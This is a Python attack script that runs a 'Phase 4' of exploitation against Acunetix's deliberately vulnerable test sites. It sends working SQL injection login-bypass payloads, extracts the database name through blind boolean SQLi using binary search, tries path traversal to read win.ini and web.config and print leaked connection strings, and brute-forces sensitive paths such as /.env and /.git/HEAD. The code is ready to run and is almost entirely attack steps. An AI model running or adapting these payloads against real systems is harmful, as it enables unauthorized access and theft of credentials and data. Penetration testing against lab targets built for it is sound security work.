#!/usr/bin/env python3
"""
PHASE 4: DEEP EXPLOITATION-GRADE VERIFICATION on authorized Acunetix test sites
 - SQLi auth bypass (Login.asp) | Blind data extraction (DB name/version)
 - Path traversal on testaspnet NewsAd param
 - Directory & sensitive-file discovery
"""
import urllib.request, urllib.error, urllib.parse, ssl, re, difflib, concurrent.futures

GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[93m"; CYAN="\033[96m"; MAG="\033[95m"; END="\033[0m"; BOLD="\033[1m"
UA={"User-Agent":"Mozilla/5.0 (compatible; SecurityTestSuite/1.0)"}
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def get(url, timeout=20):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)

def post(url, data, timeout=20):
    try:
        req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(), headers=UA)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode(errors="replace"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), e.url
    except Exception as e:
        return None, str(e), url

print(f"""{MAG}{BOLD}
=====================================================================
  PHASE 4: DEEP VERIFICATION & EXPLOITATION-GRADE PROOF
====================================================================={END}""")

# ===== T14: SQLi AUTH BYPASS — Login.asp =====
print(f"\n{BOLD}[T14] SQLi AUTHENTICATION BYPASS — POST /Login.asp {END}")
s0, b0, _ = post("http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F",
                 {"uname":"test","pword":"test","submit":"Login"})
login_marker_baseline = "Error" in b0 or "invalid" in b0.lower() or "wrong" in b0.lower()
print(f"  Baseline random creds → HTTP {s0} | size {len(b0)}B")
for payload_name, payload in [
    ("Classic OR bypass", {"uname":"' OR 1=1 --","pword":"x","submit":"Login"}),
    ("Admin OR bypass",   {"uname":"' OR 'a'='a","pword":"' OR 'a'='a","submit":"Login"}),
]:
    s, b, final_url = post("http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F", payload)
    bypassed = (s == 302 or (s==200 and "logout" in b.lower()) or (s==200 and len(b)!=len(b0) and ("welcome" in b.lower() or "forum" in b.lower())))
    diff = difflib.SequenceMatcher(None, b0, b).ratio()
    print(f"  [{payload_name}] uname={payload['uname'][:20]!r} → HTTP {s}, {len(b)}B, similarity-to-baseline {diff:.2f}")
    if s == 302:
        print(f"  {RED}>>> AUTH BYPASS: server issued REDIRECT (login accepted!){END}")
    elif bypassed and diff < 0.6:
        print(f"  {RED}>>> AUTH BYPASS LIKELY — response state changed to logged-in content{END}")

# ===== T15: BLIND SQLi DATA EXTRACTION — showforum.asp (prove readable data) =====
print(f"\n{BOLD}[T15] BLIND SQLi DATA EXTRACTION — showforum.asp?id= (extract DB user name){END}")
def bool_test(expr):
    url = f"http://testasp.vulnweb.com/showforum.asp?id=0+AND+({urllib.parse.quote(expr)})"
    s, b = get(url)
    return (s == 200 and len(b) > 4000)
# binary-search first char of DB_USER using ASCII
s, base = get("http://testasp.vulnweb.com/showforum.asp?id=0")
print(f"  Baseline sanity: HTTP {s}, {len(base)}B")
probe_true  = bool_test("1=1")
probe_false = bool_test("1=2")
print(f"  Oracle sanity: 1=1 → {probe_true} | 1=2 → {probe_false}")
if probe_true and not probe_false:
    print(f"  {RED}>>> Boolean oracle ACTIVE — extracting first 6 chars of DB_USER() via binary search...{END}")
    extracted = ""
    for pos in range(1, 7):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if bool_test(f"ASCII(SUBSTRING(DB_NAME(),{pos},1))>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        extracted += chr(lo) if lo > 32 else "?"
        print(f"    char[{pos}] = {chr(lo) if lo>32 else '?'!r}  (running: {extracted})")
    print(f"  {RED}>>> EXTRACTED DB_NAME() prefix = {extracted!r}{END}")
else:
    print(f"  {YELLOW}Oracle not stable for extraction — rely on T11/T14 evidence{END}")

# ===== T16: PATH TRAVERSAL on testaspnet — ReadNews.aspx?NewsAd= =====
print(f"\n{BOLD}[T16] PATH TRAVERSAL — testaspnet /ReadNews.aspx?NewsAd= {END}")
for name, pl in [("win.ini", "....//....//....//windows/win.ini"),
                 ("web.config", "web.config"),
                 ("dotdot aspx", "..\\..\\web.config")]:
    url = f"http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd={urllib.parse.quote(pl)}"
    s, b = get(url)
    hit = None
    if s and re.search(r"\[fonts\]", b, re.I): hit="win.ini LEAKED"
    elif s and re.search(r"connectionString|<configuration", b, re.I): hit="web.config LEAKED (may contain DB credentials!)"
    print(f"  [{name}] → HTTP {s}, {len(b)}B | {RED+hit+END if hit else 'no leak'}")
    if hit:
        m = re.search(r".{0,200}(connectionString|<configuration).{0,300}", b, re.S|re.I)
        if m: print(f"    {RED}| {m.group(0)[:400]}{END}")

# ===== T17: DIRECTORY & SENSITIVE FILE DISCOVERY (both sites) =====
print(f"\n{BOLD}[T17] SENSITIVE PATH DISCOVERY{END}")
paths = ["/admin/","/admin.asp","/Admin/","/.git/HEAD","/.env","/web.config","/Web.config",
         "/backup/","/db/","/database.sql","/App_Data/","/bin/","/debug.asp","/server-status",
         "/.svn/entries","/cgi-bin/","/install/","/phpinfo.php","/asmx/","/elmah.axd"]
def check(base, p):
    s, b = get(base + p, timeout=12)
    if s and s not in (404,) and len(b) > 50:
        return (base, p, s, len(b))
    return None
tasks = [(b, p) for b in ["http://testasp.vulnweb.com", "http://testaspnet.vulnweb.com"] for p in paths]
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
    for res in ex.map(lambda t: check(*t), tasks):
        if res:
            base, p, s, sz = res
            interesting = sz > 1000 and s == 200
            mark = RED if interesting else YELLOW
            print(f"  {mark}{base.split('//')[1].split('.')[0]:12s} {p:22s} → HTTP {s} ({sz}B){END}")

print(f"\n{GREEN}{BOLD}===== PHASE 4 COMPLETE ====={END}")
